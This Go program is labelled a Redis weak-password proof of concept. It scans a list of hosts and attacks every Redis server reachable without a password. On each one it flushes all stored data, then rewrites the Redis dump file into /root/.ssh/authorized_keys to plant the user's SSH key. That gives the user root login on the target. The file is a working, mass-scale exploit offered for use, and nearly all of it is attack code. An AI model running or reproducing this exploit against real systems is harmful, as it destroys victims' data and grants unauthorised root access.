package main

import (
	"bufio"
	"bytes"
	"fmt"
	"gopkg.in/redis.v3"
	"log"
	"os"
	"runtime"
	"strings"
	"time"
)

const rsa_key = "\n\ncat ~/.ssh/id_rsa.pub的内容，自己用ssh-keygen -t rsa生成下即可\n\n"

// HostInfo struct
type HostInfo struct {
	host   string
	port   string
	reply  string
	is_vul bool
}

// help function
func Usage(cmd string) {
	fmt.Println(strings.Repeat("-", 50))
	fmt.Println("Redis weak password poc by netxfly<x@xsec.io>")
	fmt.Println("Usage:")
	fmt.Printf("%s iplist \n", cmd)
	fmt.Println(strings.Repeat("-", 50))
}

// main function
func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) != 2 {
		Usage(os.Args[0])
	} else {
		Usage(os.Args[0])
		iplist := os.Args[1]
		Scan(Prepare(iplist))
	}
}

// read line from file and Scan
func Prepare(iplist string) (slice_iplist []string) {
	iplistFile, _ := os.Open(iplist)
	defer iplistFile.Close()
	scanner := bufio.NewScanner(iplistFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		slice_iplist = append(slice_iplist, scanner.Text())
	}

	return slice_iplist
}

//Test connect function
func TestConnect(host_info HostInfo, chan_result chan HostInfo) {
	host := host_info.host
	port := host_info.port
	reply := host_info.reply
	is_vul := false

	var buf bytes.Buffer
	logger := log.New(&buf, "logger: ", log.Ldate)

	client := redis.NewClient(&redis.Options{
		Addr:     host + ":" + port,
		Password: "", // no password set
		DB:       0,  // use default DB
	})

	_, err := client.Ping().Result()
	if err == nil {
		is_vul = true

		logger.Println(client.ConfigSet("dbfilename", "xsec.rdb").String())
		logger.Println(client.Save().String())
		logger.Println(client.FlushAll().String())

		client.Set("xsec", rsa_key, 0)
		logger.Println(client.ConfigSet("dir", "/root/.ssh/").String())
		logger.Println(client.ConfigGet("dir").String())
		reply = client.ConfigSet("dbfilename", "authorized_keys").String()
		logger.Println(reply)
		logger.Println(client.Save().String())
		fmt.Println(&buf)
	}

	host_info.is_vul = is_vul
	host_info.reply = reply
	chan_result <- host_info

}

// Scan function
func Scan(slice_iplist []string) {
	n := len(slice_iplist)
	chan_scan_result := make(chan HostInfo, n)
	done := make(chan bool, n)

	for _, host_port := range slice_iplist {
		// fmt.Printf("Try to connect %s\n", host_port)
		t := strings.Split(host_port, ":")
		host := t[0]
		port := t[1]
		host_info := HostInfo{host, port, "", false}

		go TestConnect(host_info, chan_scan_result)
		for runtime.NumGoroutine() > runtime.NumCPU()*200 {
			time.Sleep(10 * time.Microsecond)
		}

	}

	go func() {
		for i := 0; i < cap(chan_scan_result); i++ {
			select {
			case r := <-chan_scan_result:
				if r.is_vul {
					fmt.Printf("%s:%s is vulnerability, get root's reply: %s\n", r.host, r.port, r.reply)
				}
			case <-time.After(60 * time.Second):
				fmt.Println("timeout")
				break

			}
			done <- true

		}
	}()

	for i := 0; i < cap(done); i++ {
		<-done
	}

}
